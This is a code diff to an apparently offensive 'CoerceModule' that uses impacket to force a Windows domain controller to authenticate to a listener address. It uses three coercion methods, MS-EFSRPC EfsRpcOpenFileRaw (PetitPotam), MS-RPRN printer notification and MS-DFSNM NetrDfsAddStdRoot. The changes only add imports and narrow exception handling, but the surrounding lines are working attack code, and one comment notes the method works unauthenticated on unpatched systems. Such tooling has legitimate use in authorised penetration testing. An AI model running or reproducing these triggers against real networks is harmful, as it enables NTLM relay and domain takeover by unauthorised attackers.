@@ -223,6 +223,7 @@ class CoerceModule(BaseModule):
         """MS-EFSRPC: EfsRpcOpenFileRaw — works unauthenticated on unpatched systems."""
         try:
             from impacket.dcerpc.v5 import transport, efsrpc
+            from impacket.dcerpc.v5.rpcrt import DCERPCException
             from impacket.dcerpc.v5.dtypes import NULL
 
             rpctransport = transport.DCERPCTransportFactory(
@@ -240,7 +241,7 @@ class CoerceModule(BaseModule):
             unc_path = f"\\\\{listener_ip}\\share\\file"
             try:
                 efsrpc.hEfsRpcOpenFileRaw(dce, unc_path, 0)
-            except Exception:
+            except DCERPCException:
                 pass   # expected — DC will attempt auth before this fails
             finally:
                 try:
@@ -257,6 +258,8 @@ class CoerceModule(BaseModule):
         """MS-RPRN: RpcRemoteFindFirstPrinterChangeNotification — needs domain creds."""
         try:
             from impacket.dcerpc.v5 import transport, rprn
+            from impacket.dcerpc.v5.dtypes import NULL
+            from impacket.dcerpc.v5.rpcrt import DCERPCException
 
             rpctransport = transport.DCERPCTransportFactory(
                 f"ncacn_np:{dc}[\\pipe\\spoolss]"
@@ -277,7 +280,7 @@ class CoerceModule(BaseModule):
                 rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
                     dce, handle, 0x00000100, 0, f"\\\\{listener_ip}", NULL
                 )
-            except Exception:
+            except DCERPCException:
                 pass   # expected error — trigger happened
             finally:
                 try:
@@ -295,6 +298,7 @@ class CoerceModule(BaseModule):
         """MS-DFSNM: NetrDfsAddStdRoot — needs domain creds."""
         try:
             from impacket.dcerpc.v5 import transport, dfsnm
+            from impacket.dcerpc.v5.rpcrt import DCERPCException
 
             rpctransport = transport.DCERPCTransportFactory(
                 f"ncacn_np:{dc}[\\pipe\\netdfs]"
@@ -308,7 +312,7 @@ class CoerceModule(BaseModule):
 
             try:
                 dfsnm.hNetrDfsAddStdRoot(dce, f"\\\\{listener_ip}\\share", "share", 0)
-            except Exception:
+            except DCERPCException:
                 pass   # expected — trigger happened
             finally:
                 try:
